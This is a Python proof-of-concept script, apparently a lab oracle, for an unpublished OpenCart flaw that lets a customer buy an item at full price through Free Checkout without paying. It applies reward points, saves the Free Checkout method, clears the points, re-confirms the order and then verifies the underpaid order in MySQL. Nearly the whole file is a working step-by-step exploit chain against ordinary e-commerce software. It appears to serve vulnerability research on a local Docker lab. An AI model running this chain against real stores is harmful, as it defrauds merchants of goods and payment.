#!/usr/bin/env python3
"""Local oracle for OpenCart unpublished #1: reward + Free Checkout underpay.

Apply enough points to list Free Checkout, save that payment method, create a
$0 pending order, then reward=0 (does not unset payment_method). Second
confirm.confirm writes catalog price. free_checkout.confirm does not recheck
total.

Witness is oc_order.total at catalog price with payment_method free checkout
and no negative oc_customer_reward row for that order. Not a shell.
Loopback only. Distinct from coupon race CVE-2025-15116.
"""
from __future__ import annotations

import http.cookiejar
import json
import re
import ssl
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "OpenCart reward + Free Checkout underpay"
DEFAULT_BASE = "http://127.0.0.1:18108"
COMPOSE_PROJECT = "opencart-reward-free-checkout"
USER_AGENT = "opencart-reward-lab"
LANGUAGE = "en-gb"
EMAIL = "oc-reward@localhost.invalid"
PASSWORD = "LabPass123!"
PRODUCT_ID = "36"
REWARD_POINTS = "100"
HTTP_TIMEOUT_S = 60
MYSQL_TIMEOUT_S = 30
PENDING_STATUS_ID = 0
ZERO_TOTAL_MAX = 0.009
CATALOG_PRICE_MIN = 99.0
MYSQL_SERVICE = "mysql"
MYSQL_USER = "root"
MYSQL_PASSWORD = "opencart"
MYSQL_DATABASE = "opencart"
LAB_DIR = Path(__file__).resolve().parent

ROUTE_LOGIN = "account/login"
ROUTE_LOGIN_POST = "account/login.login"
ROUTE_CART_ADD = "checkout/cart.add"
ROUTE_REWARD_SAVE = "extension/opencart/checkout/reward.save"
ROUTE_PAYMENT_METHODS = "checkout/payment_method.getMethods"
ROUTE_PAYMENT_SAVE = "checkout/payment_method.save"
ROUTE_CONFIRM = "checkout/confirm.confirm"
ROUTE_FREE_CONFIRM = "extension/opencart/payment/free_checkout.confirm"
PAYMENT_CODE = "free_checkout.free_checkout"
FREE_CHECKOUT_KEY = "free_checkout"
LOGIN_TOKEN_RE = re.compile(r"login_token=([a-zA-Z0-9]+)")

SQL_CLEAR_CART = "DELETE FROM oc_cart"
SQL_LATEST_ORDER = (
    "SELECT order_id, total, order_status_id, payment_method "
    "FROM oc_order ORDER BY order_id DESC LIMIT 1"
)
SQL_CUSTOMER_BALANCE = (
    "SELECT IFNULL(SUM(points),0) FROM oc_customer_reward WHERE customer_id="
    "(SELECT customer_id FROM oc_customer WHERE email="
    "'oc-reward@localhost.invalid')"
)


@dataclass(frozen=True)
class Config:
    base: str
    language: str = LANGUAGE
    email: str = EMAIL
    password: str = PASSWORD
    product_id: str = PRODUCT_ID
    reward: str = REWARD_POINTS
    compose_project: str = COMPOSE_PROJECT
    lab_dir: Path = LAB_DIR
    http_timeout_s: int = HTTP_TIMEOUT_S
    mysql_timeout_s: int = MYSQL_TIMEOUT_S


@dataclass(frozen=True)
class OrderRow:
    order_id: str
    total: float
    status_id: int
    payment_method: str


class CatalogSession:
    def __init__(self, cfg: Config) -> None:
        self._cfg = cfg
        cookies = http.cookiejar.CookieJar()
        ssl_ctx = ssl._create_unverified_context()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ssl_ctx),
            urllib.request.HTTPCookieProcessor(cookies),
        )

    def catalog_path(self, route: str, extra: str = "") -> str:
        query = f"/index.php?route={route}&language={self._cfg.language}"
        if extra:
            query += f"&{extra}"
        return query

    def request(
        self,
        method: str,
        path: str,
        form: dict[str, str] | None = None,
    ) -> tuple[int, str, str]:
        url = path if path.startswith("http") else self._cfg.base + path
        headers = {"User-Agent": USER_AGENT}
        body: bytes | None = None
        if form is not None:
            body = urllib.parse.urlencode(form).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with self._opener.open(req, timeout=self._cfg.http_timeout_s) as resp:
                return resp.status, resp.read().decode("utf-8", "replace"), str(resp.geturl())
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace"), str(exc.geturl())
        except urllib.error.URLError as exc:
            reason = getattr(exc, "reason", exc)
            return 0, str(reason), url


def load_config(argv: list[str]) -> Config:
    raw = argv[1] if len(argv) > 1 else DEFAULT_BASE
    return Config(base=raw.rstrip("/"))


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def parse_json(body: str) -> dict[str, Any]:
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def parse_order_row(row: str, *, min_fields: int) -> OrderRow | None:
    parts = row.split("\t") if row else []
    if len(parts) < min_fields:
        return None
    try:
        payment = parts[3] if len(parts) > 3 else ""
        return OrderRow(
            order_id=parts[0],
            total=float(parts[1]),
            status_id=int(parts[2]),
            payment_method=payment,
        )
    except (IndexError, TypeError, ValueError):
        return None


def sql_order_by_id(order_id: str) -> str:
    if not order_id.isdigit():
        raise ValueError(f"non-numeric order_id={order_id!r}")
    return (
        "SELECT order_id, total, order_status_id, payment_method "
        f"FROM oc_order WHERE order_id={order_id}"
    )


def sql_reward_debit(order_id: str) -> str:
    if not order_id.isdigit():
        raise ValueError(f"non-numeric order_id={order_id!r}")
    return (
        "SELECT IFNULL(SUM(points),0) FROM oc_customer_reward "
        f"WHERE order_id={order_id} AND points<0"
    )


def mysql(cfg: Config, sql: str) -> str:
    try:
        proc = subprocess.run(
            [
                "docker",
                "compose",
                "-p",
                cfg.compose_project,
                "exec",
                "-T",
                MYSQL_SERVICE,
                "mysql",
                f"-u{MYSQL_USER}",
                f"-p{MYSQL_PASSWORD}",
                MYSQL_DATABASE,
                "-N",
                "-e",
                sql,
            ],
            cwd=cfg.lab_dir,
            capture_output=True,
            text=True,
            timeout=cfg.mysql_timeout_s,
            check=False,
        )
    except (FileNotFoundError, OSError, subprocess.TimeoutExpired):
        return ""
    out = (proc.stdout or "") + (proc.stderr or "")
    lines = [
        line
        for line in out.splitlines()
        if line.strip() and not line.lower().startswith("mysql:")
    ]
    return "\n".join(lines)


def main() -> int:
    cfg = load_config(sys.argv)
    session = CatalogSession(cfg)
    print(f"IOC base={cfg.base} product_id={cfg.product_id} reward={cfg.reward}")
    mysql(cfg, SQL_CLEAR_CART)
    status, body, _url = session.request("GET", "/")
    print(f"IOC catalog status={status} len={len(body)}")

    status, body, _url = session.request("GET", session.catalog_path(ROUTE_LOGIN))
    print(f"IOC login-page status={status} len={len(body)}")
    match = LOGIN_TOKEN_RE.search(body)
    login_token = match.group(1) if match else ""
    print(f"IOC login_token={bool(login_token)}")
    if not login_token:
        return fail("no login_token")

    status, body, url = session.request(
        "POST",
        session.catalog_path(ROUTE_LOGIN_POST, f"login_token={login_token}"),
        {"email": cfg.email, "password": cfg.password},
    )
    payload = parse_json(body)
    print(f"IOC login status={status} snippet={body[:220]!r} url={url}")
    if payload.get("error") or not (payload.get("redirect") or payload.get("success")):
        return fail("customer login")

    status, body, _url = session.request(
        "POST",
        session.catalog_path(ROUTE_CART_ADD),
        {"product_id": cfg.product_id, "quantity": "1"},
    )
    payload = parse_json(body)
    print(f"IOC cart.add status={status} snippet={body[:180]!r}")
    if not payload.get("success"):
        return fail("cart.add")

    status, body, _url = session.request(
        "POST",
        session.catalog_path(ROUTE_REWARD_SAVE),
        {"reward": cfg.reward},
    )
    payload = parse_json(body)
    print(f"IOC reward.save status={status} snippet={body[:220]!r}")
    if not payload.get("success"):
        return fail("reward.save")

    status, body, _url = session.request(
        "GET",
        session.catalog_path(ROUTE_PAYMENT_METHODS),
    )
    payload = parse_json(body)
    print(f"IOC payment.getMethods status={status} snippet={body[:320]!r}")
    payment_methods = payload.get("payment_methods") or {}
    if FREE_CHECKOUT_KEY not in payment_methods:
        return fail("free_checkout not listed after reward")

    status, body, _url = session.request(
        "POST",
        session.catalog_path(ROUTE_PAYMENT_SAVE),
        {"payment_method": PAYMENT_CODE},
    )
    payload = parse_json(body)
    print(f"IOC payment.save status={status} snippet={body[:200]!r}")
    if not payload.get("success"):
        return fail("payment_method.save")

    status, body, _url = session.request("GET", session.catalog_path(ROUTE_CONFIRM))
    print(f"IOC confirm1 status={status} len={len(body)} snippet={body[:160]!r}")
    row1 = mysql(cfg, SQL_LATEST_ORDER)
    print(f"IOC order-after-reward {row1!r}")
    first = parse_order_row(row1, min_fields=3)
    if first is None:
        return fail("no order after first confirm")
    if first.status_id != PENDING_STATUS_ID:
        return fail("first confirm already has status")
    if first.total > ZERO_TOTAL_MAX:
        return fail(f"first confirm total={first.total} not ~0")

    status, body, _url = session.request(
        "POST",
        session.catalog_path(ROUTE_REWARD_SAVE),
        {"reward": "0"},
    )
    payload = parse_json(body)
    print(f"IOC reward.clear status={status} snippet={body[:220]!r}")
    if not payload.get("success"):
        return fail("reward.save 0")

    status, body, _url = session.request("GET", session.catalog_path(ROUTE_CONFIRM))
    print(f"IOC confirm2 status={status} len={len(body)}")
    # Non-shipping carts unset session.order_id on each confirm and addOrder a
    # new row; shipping carts editOrder the pending one. Oracle is the latest.
    row2 = mysql(cfg, SQL_LATEST_ORDER)
    print(f"IOC order-after-clear {row2!r}")
    second = parse_order_row(row2, min_fields=4)
    if second is None:
        return fail("missing order after clear")
    if second.total <= ZERO_TOTAL_MAX:
        return fail("confirm after reward=0 still total~0")
    if FREE_CHECKOUT_KEY not in second.payment_method:
        return fail("payment_method unset after reward=0")

    status, body, _url = session.request(
        "POST",
        session.catalog_path(ROUTE_FREE_CONFIRM),
    )
    payload = parse_json(body)
    print(f"IOC free_checkout.confirm status={status} snippet={body[:280]!r}")
    if payload.get("error") and not payload.get("redirect"):
        status, body, _url = session.request(
            "GET",
            session.catalog_path(ROUTE_FREE_CONFIRM),
        )
        payload = parse_json(body)
        print(f"IOC free_checkout.confirm GET snippet={body[:280]!r}")
    if payload.get("error"):
        return fail("free_checkout.confirm refused")

    try:
        final_sql = sql_order_by_id(second.order_id)
        debit_sql = sql_reward_debit(second.order_id)
    except ValueError:
        return fail("no final order row")
    final = mysql(cfg, final_sql)
    print(f"IOC order-final {final!r}")
    last = parse_order_row(final, min_fields=4)
    if last is None:
        return fail("no final order row")
    debit = mysql(cfg, debit_sql).strip()
    balance = mysql(cfg, SQL_CUSTOMER_BALANCE).strip()
    print(
        f"IOC debit={debit!r} balance={balance!r} "
        f"status={last.status_id} total={last.total}"
    )

    pay_ok = FREE_CHECKOUT_KEY in last.payment_method
    # Catalog iPod Nano price is 100.00; tax was zeroed in setup.
    full_price = last.total >= CATALOG_PRICE_MIN
    try:
        no_debit = (not debit) or float(debit) == 0.0
    except ValueError:
        return fail("order not full-price free checkout without point debit")
    confirmed = last.status_id != PENDING_STATUS_ID
    if pay_ok and full_price and no_debit and confirmed:
        print(f"SUCCESS {LABEL}")
        return 0
    return fail("order not full-price free checkout without point debit")


if __name__ == "__main__":
    raise SystemExit(main())
